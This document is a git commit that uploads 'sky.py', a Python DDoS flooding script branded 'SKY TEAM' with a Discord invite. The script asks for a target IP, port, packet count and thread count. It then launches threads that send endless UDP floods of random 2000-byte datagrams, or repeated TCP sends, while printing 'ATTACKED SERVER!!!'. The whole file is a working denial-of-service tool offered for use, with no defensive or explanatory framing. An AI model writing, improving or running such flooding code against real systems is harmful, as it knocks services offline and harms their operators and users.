3b762d7400865468790d42ee98d5441dcc99506b
R3yZer <91936813+R3yZer@users.noreply.github.com>
2021-10-26 09:56:57 +0700

    Add files via upload

---
+++ sky.py
@@ -0,0 +1,72 @@
+#!/usr/bin/env python3
+#RAMAKE BY SKY COMMUNITY V1
+import sys
+import os
+import random
+import socket
+import threading
+
+os.system("clear")
+print("""\x1b[1;92m
+
+░██████╗██╗░░██╗██╗░░░██╗
+██╔════╝██║░██╔╝╚██╗░██╔╝
+╚█████╗░█████═╝░░╚████╔╝░
+░╚═══██╗██╔═██╗░░░╚██╔╝░░
+██████╔╝██║░╚██╗░░░██║░░░
+╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░
+
+████████╗███████╗░█████╗░███╗░░░███╗
+╚══██╔══╝██╔════╝██╔══██╗████╗░████║
+░░░██║░░░█████╗░░███████║██╔████╔██║
+░░░██║░░░██╔══╝░░██╔══██║██║╚██╔╝██║
+░░░██║░░░███████╗██║░░██║██║░╚═╝░██║
+░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝
+ """)
+print("↪ TOOLS V 1 ↩")
+print("↪ SKY TEEAM")
+print("↪ VERSI 1 ↩")
+print("↪ COMMUNITY SERVER ↩")
+print("↪ https://discord.gg/av7JxpRtw3↩")
+
+ip = str(input(" IP :"))
+port = int(input(" Port :"))
+choice = str(input(" YAKIN DDOS (y/n)):"))
+times = int(input(" Packet :"))
+threads = int(input(" Thread :"))
+os.system("clear")
+def run():
+	data = random._urandom(2000)
+	i = random.choice(("[×]","[?]","[!]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" SKY COMMUNITY ATTACKED SERVER!!!")
+		except:
+			print("[!] Down!!!")
+
+def run2():
+	data = random._urandom(20)
+	i = random.choice(("[×]","[?]","[!]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" SKY COMMUNITY ATTACKED SERVER!!!")
+		except:
+			s.close()
+			print("[*] Down!!!")
+
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
